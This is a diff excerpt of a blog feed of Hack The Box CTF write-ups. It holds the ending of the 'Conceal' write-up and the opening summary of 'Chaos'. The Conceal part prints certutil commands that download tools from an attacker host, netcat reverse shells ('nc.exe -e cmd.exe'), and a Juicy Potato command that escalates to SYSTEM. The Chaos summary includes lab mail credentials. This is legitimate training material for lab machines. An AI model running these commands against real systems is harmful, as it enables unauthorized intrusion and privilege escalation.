-&lt;h4 id=&quot;this-means-that-we-can-apply-the-famous-attack-juicy-potato-you-can-read-about-it-on-the-official-github-repository-we-need-to-know-the-version-of-this-windows-to-pick-the-right-clsid&quot;&gt;This means that we can apply the famous attack &lt;code class=&quot;highlighter-rouge&quot;&gt;Juicy Potato&lt;/code&gt;. You can read about it on the &lt;a href=&quot;https://github.com/ohpe/juicy-potato&quot;&gt;official github repository&lt;/a&gt;. We need to know the version of this windows to pick the right &lt;code class=&quot;highlighter-rouge&quot;&gt;clsid&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;its-microsoft-windows-10-enterprise-i-got-the-clsid-of--wuauserv-from-here-which-is--e60687f7-01a1-40aa-86ac-db1cbf673334&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Microsoft Windows 10 Enterprise&lt;/code&gt;. I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;clsid&lt;/code&gt; of  &lt;code class=&quot;highlighter-rouge&quot;&gt;wuauserv&lt;/code&gt; from &lt;a href=&quot;https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise&quot;&gt;here&lt;/a&gt; which is : &lt;code class=&quot;highlighter-rouge&quot;&gt;{e60687f7-01a1-40aa-86ac-db1cbf673334}&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;i-got-a-compiled-binary-of-juicy-potato-from-the-github-repository-i-hosted-it-on-a-python-simple-http-server-then-i-downloaded-it-on-the-machine-with-certutil-&quot;&gt;I got a compiled binary of &lt;code class=&quot;highlighter-rouge&quot;&gt;Juicy Potato&lt;/code&gt; from the github repository. I hosted it on a python simple http server then I downloaded it on the machine with &lt;code class=&quot;highlighter-rouge&quot;&gt;certutil&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/juicypotato.exe juicypotato.exe&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;however-i-had-some-problems-with-my-powershell-reverse-shell-and-it-couldnt-run-juicypotatoexe-properly-so-i-got-another-cmd-shell-with-nc-&quot;&gt;However I had some problems with my powershell reverse shell and it couldn’t run &lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe&lt;/code&gt; properly so I got another &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1339&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/24.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-created-a-bat-file-that-executes--ncexe--e-cmdexe-1010xxxx-1340-to-get-me-a-reverse-shell-&quot;&gt;I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;bat&lt;/code&gt; file that executes : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1340&lt;/code&gt; to get me a reverse shell :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 &amp;gt; rev.bat&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-i-ran-juicypotatoexe-and-made-it-execute-that-bat-file-&quot;&gt;Then I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe&lt;/code&gt; and made it execute that &lt;code class=&quot;highlighter-rouge&quot;&gt;bat&lt;/code&gt; file :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-worked-fine-and-we-got-a-reverse-shell-as-nt-authoritysystem&quot;&gt;It worked fine and we got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/27.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/conceal/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Networking" /><category term="ftp" /><category term="Web" /><category term="RCE" /><summary type="html">Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency).</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/conceal/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="rbash" /><category term="LaTeX injection" /><category term="Wordpress" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as www-data we will exploit a web application that used LaTeX. After that we will escalate privileges to another user and escape rbash. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is 10.10.10.120, I added it to /etc/hosts as chaos.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC chaos.htb We got some ports. http on port 80 and 10000, email related services (imap, pop3) running on ports 110, 143, 993 and 995. Let’s check http. HTTP Initial Enumeration Port 10000 gave me this error : So I switched to https and got a login form : We don’t have any credentials and I ran gobuster and got nothing interesting so we will ignore this and look at port 80. It’s just a normal website, rest of it : I checked that contact form and it’s doing nothing. I ran gobuster on chaos.htb and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://chaos.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:36:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /server-status (Status: 403) /source (Status: 301) ===================================================== 2019/05/24 14:40:36 Finished ===================================================== And now this part is tricky. Because going to the ip of the box 10.10.10.120 instead of chaos.htb will give us a different thing (virtual hosting). It’s saying Direct IP not allowed. I ran another gobuster scan on the ip and got different results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.120/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:41:52 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /wp (Status: 301) ===================================================== 2019/05/24 14:45:37 Finished ===================================================== On chaos.htb the thing the caught my attention was /source so I checked that and it didn’t have anything : I checked http://10.10.10.120/wp and found a wordpress website : I looked at the posts, there was only one post and it was password protected : I clicked on the post link and saw that the author of the post is called human : Before trying to bruteforce the password I tried some basic stuff first and the username:username type of credentials worked. The password was human : And we got some credentials for mail : ayush:jiujitsu Accessing the e-mail Service, Decrypting Secret Message We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used claws-mail (can be installed with apt) and configured it like this : Inbox was empty but drafts had something : ``` From: ayush ayush@localhost To: undisclosed-recipients:; Subject: service Date: Sun, 28 Oct 2018 17:46:38 +0530 User-Agent: Roundcube Webmail/1.3.8</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/chaos/0.png" /></entry></feed>
